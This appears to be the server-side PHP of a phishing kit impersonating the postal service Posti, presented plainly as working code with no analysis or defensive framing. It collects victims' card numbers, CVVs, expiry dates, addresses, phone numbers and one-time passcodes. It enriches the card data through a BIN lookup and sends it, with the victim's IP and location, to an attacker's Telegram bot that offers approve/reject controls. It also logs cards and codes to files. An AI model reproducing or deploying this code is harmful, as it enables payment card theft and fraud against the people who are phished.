<?php
if (!defined('ROOT')) die('403');


$adminKey = 'PostiAdmin2024';


$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$domain = $_SERVER['HTTP_HOST'];
$baseUrl = "$protocol://$domain";


if (!isset($_SESSION['session_id'])) {
    $_SESSION['session_id'] = bin2hex(random_bytes(8));
}
$sessionId = $_SESSION['session_id'];


$statusDir = __DIR__ . '/status';
if (!is_dir($statusDir)) {
    mkdir($statusDir, 0755, true);
}


$logsDir = __DIR__ . '/logs';
if (!is_dir($logsDir)) {
    mkdir($logsDir, 0755, true);
}


$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ipInfo = $_SESSION['ip_data'] ?? [];
$country = $ipInfo['country'] ?? 'Unknown';
$city = $ipInfo['city'] ?? 'Unknown';
$isp = $ipInfo['isp'] ?? 'Unknown';


function getBinInfo($bin) {
    $url = "https://data.handyapi.com/bin/$bin";
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    $res = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($code !== 200) return null;
    return json_decode($res, true);
}


function sendTelegram($msg, $sessionId, $type, $baseUrl, $adminKey) {
    if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
        return false;
    }


    $approveUrl = "$baseUrl/?r=action&key=$adminKey&session=$sessionId&type=$type&act=approve";
    $rejectUrl = "$baseUrl/?r=action&key=$adminKey&session=$sessionId&type=$type&act=reject";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ APPROUVER', 'url' => $approveUrl],
                ['text' => '❌ REFUSER', 'url' => $rejectUrl]
            ]
        ]
    ];

    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $msg,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}


if (isset($_POST['cc'])) {
    $_SESSION['_cc'] = $_POST['cc'];
    $_SESSION['_name'] = $_POST['name'];
    $_SESSION['_exp'] = $_POST['exp'];
    $_SESSION['_cvv'] = $_POST['cvv'];
    $_SESSION['_address'] = $_POST['address'] ?? '';
    $_SESSION['_city'] = $_POST['city'] ?? '';
    $_SESSION['_zip'] = $_POST['zip'] ?? '';
    $_SESSION['_phone'] = $_POST['phone'] ?? '';


    $cardNumber = preg_replace('/\s+/', '', $_POST['cc']);
    $bin = substr($cardNumber, 0, 6);
    $binInfo = getBinInfo($bin);


    $msg = "<b>🔔 POSTI - NOUVELLE CARTE 💳</b>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n\n";
    $msg .= "<b>👤 Titulaire:</b> <code>{$_POST['name']}</code>\n";
    $msg .= "<b>💳 Numéro:</b> <code>{$_POST['cc']}</code>\n";
    $msg .= "<b>📅 Expiration:</b> <code>{$_POST['exp']}</code>\n";
    $msg .= "<b>🔐 CVV:</b> <code>{$_POST['cvv']}</code>\n\n";


    if ($binInfo && isset($binInfo['Scheme'])) {
        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "<b>🏦 INFO CARTE (BIN)</b>\n\n";
        $msg .= "<b>🔖 Marque:</b> " . ($binInfo['Scheme'] ?? 'N/A') . "\n";
        $msg .= "<b>💎 Niveau:</b> " . ($binInfo['CardTier'] ?? 'N/A') . "\n";
        $msg .= "<b>📝 Type:</b> " . ($binInfo['Type'] ?? 'N/A') . "\n";
        $msg .= "<b>🏛 Banque:</b> " . ($binInfo['Issuer'] ?? 'N/A') . "\n";
        $msg .= "<b>🌍 Pays:</b> " . ($binInfo['Country']['A2'] ?? 'N/A') . " " . ($binInfo['Country']['Name'] ?? '') . "\n\n";
    }

    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "<b>📍 ADRESSE</b>\n\n";
    $msg .= "<b>🏠 Rue:</b> {$_POST['address']}\n";
    $msg .= "<b>🏙 Ville:</b> {$_POST['city']}\n";
    $msg .= "<b>📮 Code postal:</b> {$_POST['zip']}\n";
    $msg .= "<b>📱 Téléphone:</b> {$_POST['phone']}\n\n";

    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "<b>🌐 INFOS CONNEXION</b>\n\n";
    $msg .= "<b>📍 IP:</b> <code>$ip</code>\n";
    $msg .= "<b>🗺 Pays:</b> $country\n";
    $msg .= "<b>🏙 Ville:</b> $city\n";
    $msg .= "<b>📡 ISP:</b> $isp\n";
    $msg .= "<b>🔖 Session:</b> <code>$sessionId</code>\n\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "⏰ " . date('d/m/Y H:i:s') . "\n";


    file_put_contents("$statusDir/$sessionId.txt", 'pending_cc');


    sendTelegram($msg, $sessionId, 'cc', $baseUrl, $adminKey);


    $logData = date('Y-m-d H:i:s') . " | CC | $ip | {$_POST['cc']} | Session: $sessionId\n";
    @file_put_contents("$logsDir/cards.log", $logData, FILE_APPEND | LOCK_EX);

    header("Location: /?r=w&type=cc");
    exit;
}


if (isset($_POST['otp'])) {
    $msg = "<b>🔔 POSTI - NOUVEAU CODE OTP 🔑</b>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n\n";
    $msg .= "<b>💳 Carte:</b> <code>{$_SESSION['_cc']}</code>\n";
    $msg .= "<b>🔑 Code OTP:</b> <code>{$_POST['otp']}</code>\n\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "<b>📍 IP:</b> <code>$ip</code>\n";
    $msg .= "<b>🔖 Session:</b> <code>$sessionId</code>\n\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "⏰ " . date('d/m/Y H:i:s') . "\n";


    file_put_contents("$statusDir/$sessionId.txt", 'pending_otp');


    sendTelegram($msg, $sessionId, 'otp', $baseUrl, $adminKey);


    $logData = date('Y-m-d H:i:s') . " | OTP | $ip | {$_POST['otp']} | Session: $sessionId\n";
    @file_put_contents("$logsDir/otps.log", $logData, FILE_APPEND | LOCK_EX);

    if (isset($_POST['exit'])) {
        header("Location: /?r=e&status=error");
        exit;
    }

    header("Location: /?r=w&type=otp");
    exit;
}
?>
